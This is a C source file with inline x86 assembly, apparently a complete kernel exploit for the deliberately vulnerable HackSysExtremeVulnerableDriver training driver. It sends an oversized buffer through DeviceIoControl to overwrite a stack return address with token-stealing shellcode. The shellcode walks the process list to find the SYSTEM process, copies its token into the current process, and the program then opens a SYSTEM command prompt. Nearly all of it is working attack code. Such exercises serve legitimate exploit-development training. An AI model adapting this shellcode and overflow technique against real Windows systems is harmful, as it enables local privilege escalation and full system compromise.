#include <stdio.h>
#include <Windows.h>

#define KTHREAD_OFFSET  0x124		//+0x124 CurrentThread      : Ptr32 _KTHREAD
#define EPROCESS_OFFSET 0x050		//+0x050 Process            : Ptr32 _KPROCESS
#define FLINK_OFFSET    0x0b8		//+0x0b8 ActiveProcessLinks : _LIST_ENTRY
#define PID_OFFSET      0x0b4		//+0x0b4 UniqueProcessId    : Ptr32 Void
#define TOKEN_OFFSET    0x0f8		//+0x0f8 Token              : _EX_FAST_REF
#define SYSTEM_PID      0x004		//System Process ID
#define BUFFER_SIZE	0x824		//Overflow offset
#define CASE_ID		0x222003

VOID TokenStealingShellcode()
{
  __asm
  {
    ; initialize
    pushad;
    mov eax, fs: [KTHREAD_OFFSET] ;         //get current thread
    mov ecx, [eax + EPROCESS_OFFSET];       //get the process
    mov eax, ecx;
    mov ebx, SYSTEM_PID;

    SearchSystemPID:
    mov eax, [eax + FLINK_OFFSET];          //get the ActiveProcessLinks
    sub eax, FLINK_OFFSET;
    mov edx, [eax + PID_OFFSET];            //get the PID
    cmp edx, ebx;
    jnz SearchSystemPID;

    mov edx, [eax + TOKEN_OFFSET];	      //change the token
    mov [ecx + TOKEN_OFFSET], edx;

    ; recovery
    popad;
    xor eax, eax;                           //return NT_SUCCESS
    add esp, 0xC;                           //fix the stack
    pop ebp;
    ret 8;
  }
}

int main()
{
  printf("**************************Start To Exploit**************************\n\n");
  printf("11     11       1111111111        11        11      111111111111111\n");
  printf("11   11         11                  11    11        11           11\n");
  printf("11 11           1111111111            1111          111111111111111\n");
  printf("11 11           1111111111            1111          11\n");
  printf("11   11         11                  11    11        11\n");
  printf("11     11       1111111111        11        11      11\n\n");
  printf("**************************Start To Exploit**************************\n");

  CHAR buffer[BUFFER_SIZE];
  ULONG length = 0;

  HANDLE hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
      GENERIC_READ | GENERIC_WRITE,
      FILE_SHARE_READ | FILE_SHARE_WRITE,
      0,
      OPEN_EXISTING,
      FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
      0);

  if (hDevice == INVALID_HANDLE_VALUE)
  {
    printf("[-] Failed to open the file……\n");
    return -1;
  }

  memset(buffer, 'a', BUFFER_SIZE);
  *(PULONG)(buffer + 0x820) = (ULONG)TokenStealingShellcode;
  BOOL ret = DeviceIoControl(hDevice,
      CASE_ID,
      buffer,
      BUFFER_SIZE,
      NULL,
      0,
      &length,
      NULL);
  if (!ret)
  {
    printf("[-] Failed to send message……\n");
    CloseHandle(hDevice);
    return -1;
  }

  printf("[+] Success to execute the payload……\n");

  STARTUPINFO si;
  PROCESS_INFORMATION pi;

  ZeroMemory(&si, sizeof(si));
  ZeroMemory(&pi, sizeof(pi));
  si.cb = sizeof(si);

  CreateProcess(L"C:\\Windows\\System32\\cmd.exe",
      NULL,
      NULL,
      NULL,
      0,
      CREATE_NEW_CONSOLE,
      NULL,
      NULL,
      &si,
      &pi);

  CloseHandle(hDevice);
  return 0;
}